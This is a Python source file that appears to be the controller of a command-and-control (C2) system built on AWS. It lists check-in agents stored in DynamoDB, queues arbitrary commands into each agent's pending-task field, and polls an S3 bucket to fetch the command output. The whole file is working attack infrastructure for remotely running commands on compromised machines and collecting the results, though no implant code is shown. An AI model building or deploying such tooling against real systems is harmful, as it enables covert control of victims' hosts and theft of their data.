import boto3
import time
from botocore.exceptions import ClientError


AGENTS_TABLE_NAME = "c2-agents-table"
RESULTS_BUCKET_NAME = "c2-results-bucket-alvaroneto-654561"

try:
    dynamodb_resource = boto3.resource("dynamodb", region_name="us-east-1")
    agents_table = dynamodb_resource.Table(AGENTS_TABLE_NAME)
    s3_client = boto3.client("s3", region_name="us-east-1")

except Exception as e:
    print(f"[ERROR] Unable to initialize AWS connection: {e}")
    agents_table = None
    s3_client = None


def list_agents():
    if not agents_table:
        print("[ERROR] DynamoDB table reference is not available.")
        return []

    try:
        response = agents_table.scan()
        agents_list = sorted(
            response.get("Items", []),
            key=lambda item: item.get("lastSeen", ""),
            reverse=True,
        )

        return agents_list

    except ClientError as e:
        error = e.response.get("Error", {}).get("Code")
        print(f"[ERROR] Failed to fetch agents from DynamoDB ({error}): {e}")
        return []

    except Exception as e:
        print(f"[ERROR] Unexpected error occurred while listing agents: {e}")
        return []


def send_task_to_agent(agent_id, command):
    if not agents_table:
        print("[ERROR] DynamoDB table reference is not available.")
        return False

    try:
        agents_table.update_item(
            Key={"agentId": agent_id},
            UpdateExpression="SET pendingTask = :task_value",
            ExpressionAttributeValues={":task_value": command},
        )
        return True

    except ClientError as e:
        error = e.response.get("Error", {}).get("Code")
        print(f"Error: {error} Agent not found or failed to submit task: {e}")
        return False


def execute_task_wait_result(agent_id, command):
    if not s3_client:
        return "[ERROR] S3 client reference is not available."

    try:
        prefix = f"{agent_id}/"
        response_before = s3_client.list_objects_v2(Bucket=RESULTS_BUCKET_NAME, Prefix=prefix)
        old_results = {obj["Key"] for obj in response_before.get("Contents", [])}
        # print(f"Sending task '{command}' to agent {agent_id}...")

        if not send_task_to_agent(agent_id, command):
            return "[ERROR] The task could not be submitted. Aborting."

        # print("Waiting for result...")
        timeout_seconds = 90
        poll_interval_seconds = 2

        for i in range(timeout_seconds // poll_interval_seconds):
            time.sleep(poll_interval_seconds)

            response_after = s3_client.list_objects_v2(Bucket=RESULTS_BUCKET_NAME, Prefix=prefix)
            current_results = {obj["Key"] for obj in response_after.get("Contents", [])}

            new_files = current_results - old_results

            if new_files:
                new_file_key = new_files.pop()
                # print(f"New result found: {new_file_key}")

                file_object = s3_client.get_object(Bucket=RESULTS_BUCKET_NAME, Key=new_file_key)
                file_content = file_object["Body"].read().decode("utf-8")
                return file_content

        return f"[TIMEOUT] No results received in {timeout_seconds} seconds."

    except Exception as e:
        return f"[ERROR] Unexpected error occurred while fetching result: {e}"
